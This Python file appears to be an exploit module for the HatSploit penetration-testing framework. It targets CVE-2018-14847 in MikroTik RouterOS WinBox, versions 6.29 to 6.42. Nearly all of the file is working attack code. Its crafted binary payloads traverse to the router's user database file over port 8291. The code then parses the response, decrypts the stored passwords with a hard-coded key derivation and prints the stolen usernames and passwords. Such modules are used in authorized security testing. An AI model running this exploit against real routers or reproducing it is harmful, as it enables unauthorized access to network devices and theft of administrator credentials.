"""
This module requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

from hashlib import md5

from hatsploit.lib.core.module.basic import *
from hatsploit.lib.core.module.proto import TCP


class HatSploitModule(Module, TCP):
    def __init__(self):
        super().__init__({
            'Category': "exploit",
            'Name': "Mikrotik WinBox Credentials Disclosure",
            'Module': "exploit/linux/mikrotik/winbox_credentials_disclosure",
            'Authors': [
                "Ivan Nikolskiy (enty8080) - module developer",
                "Alireza Mosajjal - vulnerability researcher",
                "Mostafa Yalpaniyan - vulnerability researcher",
            ],
            'Description': """
                Mikrotik WinBox RouterOS from 6.29 till 6.42 credentials disclosure.
            """,
            'Platform': OS_LINUX,
            'Rank': HIGH_RANK,
            'Devices': [
                "Mikrotik RouterOS versions from 6.29 (release date: 2015/28/05) to 6.42 (release date 2018/04/20)"
            ],
            'References': [
                {'URL': 'https://github.com/BasuCert/WinboxPoC'},
                {'URL': 'https://nvd.nist.gov/vuln/detail/cve-2018-14847'},
                {'CVE': '2018-14847'}
            ],
            'DisclosureDate': "2018-02-08",
            'Notes': {
                'Stability': [CRASH_SAFE],
                'Reliability': [],
                'SideEffects': [],
            },
        })

    def __call__(self):
        self.port.set(8291)

    creds = []

    stage1 = (
        b"\x68\x01\x00\x66\x4d\x32\x05\x00\xff\x01\x06\x00\xff\x09\x05\x07"
        b"\x00\xff\x09\x07\x01\x00\x00\x21\x35\x2f\x2f\x2f\x2f\x2f\x2e\x2f"
        b"\x2e\x2e\x2f\x2f\x2f\x2f\x2f\x2f\x2e\x2f\x2e\x2e\x2f\x2f\x2f\x2f"
        b"\x2f\x2f\x2e\x2f\x2e\x2e\x2f\x66\x6c\x61\x73\x68\x2f\x72\x77\x2f"
        b"\x73\x74\x6f\x72\x65\x2f\x75\x73\x65\x72\x2e\x64\x61\x74\x02\x00"
        b"\xff\x88\x02\x00\x00\x00\x00\x00\x08\x00\x00\x00\x01\x00\xff\x88"
        b"\x02\x00\x02\x00\x00\x00\x02\x00\x00\x00"
    )

    stage2 = (
        b"\x3b\x01\x00\x39\x4d\x32\x05\x00\xff\x01\x06\x00\xff\x09\x06\x01"
        b"\x00\xfe\x09\x35\x02\x00\x00\x08\x00\x80\x00\x00\x07\x00\xff\x09"
        b"\x04\x02\x00\xff\x88\x02\x00\x00\x00\x00\x00\x08\x00\x00\x00\x01"
        b"\x00\xff\x88\x02\x00\x02\x00\x00\x00\x02\x00\x00\x00"
    )

    @staticmethod
    def extract_from_entry(entry):
        username = entry.split(b"\x01\x00\x00\x21")[1]
        password = entry.split(b"\x11\x00\x00\x21")[1]

        username_len = username[0]
        password_len = password[0]

        username = username[1: 1 + username_len]
        password = password[1: 1 + password_len]

        return username, password

    @staticmethod
    def decrypt_password(username, password):
        key = md5(username + b"283i4jfkai3389").digest()

        passwd = ""
        for i, _ in enumerate(password):
            passwd += chr(password[i] ^ key[i % len(key)])

        return passwd.split("\x00")[0]

    def get_pair(self, data):
        users = []

        entries = data.split(b"M2")[1:]
        for entry in entries:
            try:
                username, password = self.extract_from_entry(entry)
            except Exception:
                continue

            password = self.decrypt_password(username, password)
            username = username.decode("ascii")

            users.append((username, password))

        return users

    def obtain_credentials(self):
        client = self.open_tcp()

        client.connect()
        client.send(self.stage1)

        data = client.recv(1024)
        if not data or len(data) < 39:
            return None

        pkt = self.stage2[:19] + data[38:39] + self.stage2[20:]
        client.send(pkt)

        data = client.recv(1024)
        if not data:
            return None

        client.disconnect()
        creds = self.get_pair(data)

        return creds

    def check(self):
        self.creds = self.obtain_credentials()

        if not self.creds:
            return False

        return True

    def run(self):
        self.print_table("Credentials", ('Username', 'Password'), *self.creds)
